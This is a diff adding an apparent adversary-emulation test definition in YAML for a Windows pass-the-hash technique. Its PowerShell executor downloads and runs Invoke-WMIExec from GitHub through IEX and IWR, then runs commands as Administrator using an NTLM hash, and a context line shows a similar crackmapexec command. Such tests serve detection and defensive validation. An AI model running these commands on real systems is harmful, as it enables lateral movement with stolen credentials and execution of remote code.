@@ -82,3 +82,32 @@ atomic_tests:
     command: |
       #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
     name: command_prompt
+- name: Invoke-WMIExec Pass the Hash
+  description: |-
+    Use Invoke-WMIExec to Pass the Hash
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+  supported_platforms:
+  - windows
+  input_arguments:
+    ntlm:
+      description: ntlm hash
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    command:
+      description: Command to run on target system
+      type: string
+      default: hostname
+    target:
+      description: System to run command on
+      type: string
+      default: '$env:COMPUTERNAME'
+  executor:
+    command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://github.com/Kevin-Robertson/Invoke-TheHash/blob/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
+    name: powershell
